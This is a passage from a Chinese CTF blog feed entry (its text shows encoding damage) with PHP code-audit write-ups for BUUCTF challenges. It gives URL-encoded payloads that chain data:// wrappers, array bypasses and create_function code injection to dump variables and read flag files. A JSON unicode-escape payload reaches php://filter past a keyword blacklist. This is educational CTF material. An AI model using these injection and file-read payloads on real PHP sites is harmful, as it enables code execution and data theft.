class="line">1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;create_function&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;</span><br><span class="line">POST: debu&#x3D;1&amp;file&#x3D;1</span><br></pre></td></tr></table></figure><p>è§£ç åå°±æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1nD3x.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;debu&#x3D;aqua_is_cute</span><br><span class="line">&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;</span><br><span class="line">POST: debu&#x3D;1&amp;file&#x3D;1</span><br></pre></td></tr></table></figure><p>æ‰“å°äº†æ‰€æœ‰å˜é‡</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200717100826.png" alt=""></p><p>æç¤ºæˆ‘ä»¬çœŸçš„flagåœ¨<code>realfl4g.php</code>é‡Œé¢ï¼Œé‚£ä¹ˆå°±å»åŒ…å«<code>realfl4g.php</code>æ–‡ä»¶ã€‚</p><p>è¿™ä¸ªåœ°æ–¹è¿‡æ»¤äº†<code>include</code>å’Œå•å¼•å·ï¼Œå¯ä»¥ç”¨<code>require()</code>æ¥ä»£æ›¿ï¼Œè¿‡æ»¤<code>flag</code>å…³é”®å­—ï¼Œå°±ç”¨base64ç¼–ç ç»•è¿‡ã€‚é‚£ä¹ˆpayloadå°±æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1nD3x.php?</span><br><span class="line">file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67[%61%72%67]&#x3D;&#125;require(base64_%64%65%63%6f%64%65(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;&amp;%66%6c%61%67[%63%6f%64%65]&#x3D;create_function</span><br><span class="line">POST: debu&#x3D;1&amp;file&#x3D;1</span><br></pre></td></tr></table></figure><p>è§£ç å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;debu&#x3D;aqua_is_cute</span><br><span class="line">&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;&#125;require(base64_decode(cmVhbGZsNGcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200717102737.png" alt=""></p><h4 id="å–åç»•è¿‡-ä¼ªåè®®è¯»å–æºç ">å–åç»•è¿‡+ä¼ªåè®®è¯»å–æºç </h4><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1nD3x.php?%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;create_function&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">POST: debu&#x3D;1&amp;file&#x3D;1</span><br></pre></td></tr></table></figure><p>è¯»åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Real_Flag In Here!!!&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;å’¦ï¼Œä½ å±…ç„¶æ‰¾åˆ°æˆ‘äº†ï¼Ÿï¼ä¸è¿‡çœ‹åˆ°è¿™å¥è¯ä¹Ÿä¸ä»£è¡¨ä½ å°±èƒ½æ‹¿åˆ°flagå“¦ï¼&quot;</span>;</span><br><span class="line">$f4ke_flag = <span class="string">&quot;BJD&#123;1am_a_fake_f41111g23333&#125;&quot;</span>;</span><br><span class="line">$rea1_f1114g = <span class="string">&quot;flag&#123;b1fcb796-18ed-4790-96d4-42becc504efc&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">unset</span>($rea1_f1114g);</span><br></pre></td></tr></table></figure><p>åŸæ¥æ˜¯æŠŠå˜é‡ç»™é‡Šæ”¾äº†ã€‚</p><h3 id="æ‹“å±•-v3">æ‹“å±•</h3><p>ä»‹ç»ä¸€ç§éé¢„æœŸè§£ï¼š</p><h4 id="æ•°ç»„ç»•è¿‡">æ•°ç»„ç»•è¿‡</h4><p>åŠ äº†ä¸ªå‚æ•°ï¼Œä¼ ä¸Šå»ä¼ªåè®®ï¼Œç„¶å<code>get_defined_vars()</code>æ•°ç»„è·å–åˆ°è¿™ä¸ªä¼ªåè®®æ”¾åˆ°<code>require()</code>é‡ŒåŒ…å«ï¼Œpayloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?deb%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file&#x3D;%64%61%74%61%3a%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;rce&#x3D;%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%72%65%61%64%3d%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%65%6e%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%72%65%61%31%66%6c%34%67%2e%70%68%70&amp;rce2&#x3D;r&amp;sha%6e%61[]&#x3D;a&amp;pa%73sw%64[]&#x3D;b&amp;fla%67[co%64e]&#x3D;create_function&amp;fla%67[ar%67]&#x3D;;&#125;require(get_defined_vars()[_GET][rce]);%0a&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>è§£ç åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?debu&#x3D;aqua_is_cute</span><br><span class="line">&amp;file&#x3D;data:,debu_debu_aqua&amp;rce&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;rea1fl4g.php&amp;rce2&#x3D;r&amp;shana[]&#x3D;a&amp;passwd[]&#x3D;b&amp;flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;;&#125;require(get_defined_vars()[_GET][rce]);</span><br><span class="line">&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ">å‚è€ƒ</h3><p><a href="https://www.gem-love.com/ctf/770.html">https://www.gem-love.com/ctf/770.html</a></p><h2 id="HarekazeCTF2019-encode-and-encode">[HarekazeCTF2019]encode_and_encode</h2><h3 id="è€ƒç‚¹-v11">è€ƒç‚¹</h3><ul><li>jsonå­—ç¬¦è½¬ä¹‰</li><li>ä¼ªåè®®ç»•è¿‡</li></ul><h3 id="è§£é¢˜-v11">è§£é¢˜</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$str</span>) </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $banword) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$json = json_decode($body, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  $page = $json[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $content = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">&#x27;content&#x27;</span> =&gt; $content]);</span><br></pre></td></tr></table></figure><p>å¤§æ¦‚å°±æ˜¯ä¼ ä¸€ä¸ªjsonç¼–ç çš„æ•°æ®ï¼Œç„¶åjsonè§£ç ï¼Œè¿›è¡Œis_validé»‘åå•è¿‡æ»¤ï¼Œç„¶åfile_get_contentsï¼Œå†ä¸€æ¬¡è¿›è¡Œé»‘åå•è¿‡æ»¤ï¼Œä¹Ÿå°±æ˜¯æ—¢å¯¹åŸå§‹æ•°æ®ï¼Œåˆå¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œç”±äºjsonä½¿æ”¯æŒunicodeç¼–ç çš„ï¼Œæ‰€ä»¥å¯ä»¥ç”¨unicodeä»£æ›¿å…³é”®å­—ï¼Œå¹¶ç”¨ä¼ªåè®®base64ç¼–ç ï¼Œpayload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;page&quot;:&quot;\u0070\u0068\u0070:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;\u0066\u006c\u0061\u0067&quot;&#125;</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ-v2">å‚è€ƒ</h3><p><a href="https://p1htmlkernalweb.mybluemix.net/articles/%5BHarekazeCTF2019%5Dencode_and_encode_3837296_csdn.html">https://p1htmlkernalweb.mybluemix.net/articles/[HarekazeCTF2019]encode_and_encode_3837296_csdn.html</a></p><h2 id="CISCN2019-æ€»å†³èµ›-Day1-Web4-Laravel1">[CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1</h2><h3 id="TODO-v2">TODO</h3><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox">[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</h2><h3 id="TODO-v3">TODO</h3><h2 id="HarekazeCTF2019-Easy-Notes">[HarekazeCTF2019]Easy Notes</h2><h3 id="TODO-v4">TODO</h3><h2 id="RCTF-2019-Nextphp">[RCTF 2019]Nextphp</h2><h3 id="TODO-v5">TODO</h3><h2 id="De1CTF-2019-ShellShellShell">[De1CTF 2019]ShellShellShell</h2><h3 id="TODO-v6">TODO</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BUUCTFåˆ·é¢˜â€”â€”PHPä»£ç å®¡è®¡&quot;&gt;BUUCTFåˆ·é¢˜â€”â€”PHPä»£ç å®¡è®¡&lt;/h1&gt;
&lt;h2 id=&quot;HCTF2018-WarmingUp&quot;&gt;[HCTF2018]WarmingUp&lt;/h2&gt;
&lt;h3 id=&quot;è€ƒç‚¹&quot;&gt;è€ƒç‚¹&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ä»£ç å®¡è®¡&lt;/li
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
      <category term="ä»£ç å®¡è®¡" scheme="http://ca0y1h.top/categories/CTF/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
</feed>
